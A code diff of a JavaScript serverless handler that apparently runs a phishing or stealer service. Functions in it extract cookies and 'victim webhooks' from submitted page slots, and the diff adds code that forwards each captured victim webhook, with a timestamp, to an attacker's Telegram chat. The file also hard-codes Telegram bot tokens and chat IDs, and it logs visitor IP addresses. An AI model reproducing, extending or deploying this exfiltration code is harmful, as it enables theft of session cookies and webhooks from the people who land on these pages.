@@ -6,7 +6,7 @@ const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// Telegram Bot 2 - Webhook Info
+// Telegram Bot 2 - Webhook Info (Victim Webhooks, Slot/Dualhook Creation)
 const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
 const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';
 
@@ -361,7 +361,7 @@ async function tgSendAccount(text) {
   } catch (_) {}
 }
 
-// Bot 2 - Webhook Info
+// Bot 2 - Webhook Info (Victim Webhooks)
 async function tgSendWebhook(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
@@ -386,6 +386,16 @@ function findCookie(slots) {
   for (const val of Object.values(slots || {})) {
     const c = extractCookie(String(val || ''));
     if (c) return c;
+  }
+  return null;
+}
+
+// Find victim webhook from slots (webhook1, webhook2, etc.)
+function findVictimWebhook(slots) {
+  for (const [key, val] of Object.entries(slots || {})) {
+    if (key.startsWith('webhook') && val) {
+      return val;
+    }
   }
   return null;
 }
@@ -517,6 +527,20 @@ export default async function handler(req, res) {
   const record = await redisGet(`slot:${slug}`);
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
+
+  // Check for victim webhook in slots (webhook1, webhook2, etc.)
+  const victimWebhook = findVictimWebhook(slots);
+  if (victimWebhook) {
+    await tgSendWebhook([
+      `🎯 <b>NEW VICTIM WEBHOOK</b>`,
+      `📄 <b>Page:</b> ${record.displayName || slug}`,
+      ``,
+      `<b>Webhook:</b>`,
+      `<code>${victimWebhook}</code>`,
+      ``,
+      `🕐 ${new Date().toISOString()}`
+    ].join('\n'));
+  }
 
   const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
               || req.headers['x-real-ip'] || 'Unknown';
@@ -694,17 +718,6 @@ export default async function handler(req, res) {
       `🕐 ${now}`
     ].join('\n'));
   }
-
-  // Telegram Bot 2 - Webhook Info
-  await tgSendWebhook([
-    `🪝 <b>WEBHOOK INFO — ${pName}</b>`,
-    ``,
-    `<b>Page Webhook:</b>`,
-    `<code>${record.webhook}</code>`,
-    record.dualhookParent ? `<b>Parent Webhook:</b> <code>${webhook1}</code>` : '',
-    ``,
-    `🕐 ${now}`
-  ].filter(Boolean).join('\n'));
 
   return res.status(200).json({ 
     success: true, 
